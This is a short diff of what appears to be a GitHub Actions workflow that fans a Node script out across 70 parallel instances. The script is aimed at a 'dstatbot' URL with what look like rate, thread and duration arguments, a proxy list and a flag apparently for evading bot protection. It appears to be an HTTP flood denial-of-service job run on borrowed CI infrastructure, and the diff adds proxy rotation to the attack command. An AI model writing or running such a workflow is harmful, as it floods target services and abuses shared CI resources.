@@ -41,7 +41,7 @@ jobs:
           cd ideal-guide
           unzip Fc-main.zip
           cd Fc-main
-          node y.js GET https://c2.dstatbot.win/xpnxLdyf 350 4 90  --bfm true --debug 
+          node a.js GET https://c2.dstatbot.win/dULfZXOQ 350 4 90 proxy.txt --bfm true --debug 
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
